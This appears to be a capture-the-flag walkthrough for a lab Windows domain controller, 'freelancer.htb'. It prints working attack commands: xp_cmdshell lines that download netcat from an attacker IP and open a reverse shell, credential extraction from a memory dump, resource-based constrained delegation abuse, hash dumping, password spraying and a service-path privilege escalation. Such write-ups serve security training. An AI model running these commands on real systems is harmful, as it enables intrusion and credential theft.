#  Initial Reconnaissance

Nmap Results:

```
53/tcp: Simple DNS Plus
80/tcp: nginx 1.25.5
88/tcp: Microsoft Windows Kerberos
135/tcp: Microsoft Windows RPC
139/tcp: Microsoft Windows netbios-ssn
389/tcp: Microsoft Windows Active Directory LDAP
445/tcp: Microsoft Windows SMB
464/tcp: Kerberos kpasswd5
593/tcp: Microsoft Windows RPC over HTTP
3268/tcp: Microsoft Windows Active Directory LDAP
5985/tcp: Microsoft HTTPAPI httpd 2.0
9389/tcp: .NET Message Framing
49670/tcp - 62402/tcp: Microsoft Windows RPC
```

#  port 80

Web Application Access:

- Create accounts as employee.
- Reset the password for the employee account to bypass login errors. IDOR Vulnerability:
- Capture and decode the QR code URL to identify an IDOR vulnerability.
- Modify the decoded ID to gain admin access by changing the encoded base64 ID to `2`.

#  Gaining SQL Shell

- Access SQL Terminal: Execute commands in the SQL terminal from the admin panel.
- Enable xp_cmdshell:

```
EXECUTE AS LOGIN = 'sa';
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell "powershell.exe wget http://10.10.14.62/nc.exe -OutFile c:\\Users\\Public\\nc.exe"
EXECUTE xp_cmdshell "powershell.exe c:\Users\Public\nc.exe -e cmd.exe 10.10.14.62 4444"
```

- Get Reverse Shell: Use xp_cmdshell to obtain a reverse shell as `SQL_SVC`

#  Lateral Movement

Enumerate SQL_SVC:

- Retrieve passwords for the user `mikasaAckerman` stored in `\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU\sql-Configuration.INI`.
- Get shell as `mikasaAckerman` using `RunasCs` Get `user.txt`
- Bloodhound Data Collection:

```
python3 bloodhound.py -u mikasaAckerman -p 'PASSWORD' -d freelancer.htb -ns IP -c all
```

Memory Dump and Mail.txt:

- Memory Dump: Found in MEMORY.7z, containing the dump of the processes of the whole server.
- Mimikatz: Use to extract credentials.
- Extract `lsass.exe`: Remove the process `lsass.exe` from the dump, focusing on lsass.exe to dump the SAM.
- SAM Extraction: Find `lorra199`’s password in the SAM.

Shell as lorra199:

- Use Evil-winrm to gain access as `lorra199` using the found credentials
- If we look at the bloodhound data we can see that `lorra199` is a member of the `AD Recycle Bin` and has generic rights on the domain controller. WE can use this rights to abuse `rbcd (resource-based constrained delegation)` and impersonate as `Administrator`

Add Computer Account:

```
addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'
```

Grant Delegation Rights:

```
impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -dc-ip 10.xx.xx.xx -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
```

#  Domain Admin Access

- Get Service Ticket using `getST.py`
    
    ```
    getST.py -spn 'cifs/DC.freelancer.htb' -impersonate Administrator -dc-ip 10.xx.xx.xx 'freelancer.htb/ATTACKERSYSTEM$:Summer2018!'
    ```
    
- Dump Hashes using `secretsdump.py`
    
    ```
    secretsdump.py 'freelancer.htb/Administrator@DC.freelancer.htb' -k -no-pass -dc-ip 10.xx.xx.xx -target-ip 10.xx.xx.xx -just-dc-ntlm
    ```
    
- use Evil-WInrm to gain access and `Administrator` and get `root.txt`

#  Probably Unintended

- Spray the passwords using kerbrute
    
    ```
    for i in `cat passwords.txt`; do ./kerbrute_linux_amd64 passwordspray -d freelancer.htb --dc 10.10.11.15 userlist.txt $i;done > output.txt
    ```
    
- You will get password for jmartinez
    
    ```
    .\RunasCs.exe jmartinez "v3ryS0l!dP@sswd#35" cmd.exe -r 10.10.xx.xx:PORT
    ```
    

ROOT FLAG:

- Abuse the server operator

```
sc.exe stop VMTools
sc.exe config VMTools binpath="cmd /c net localgroup administrators jmartinez /add"
sc.exe start VMTools
```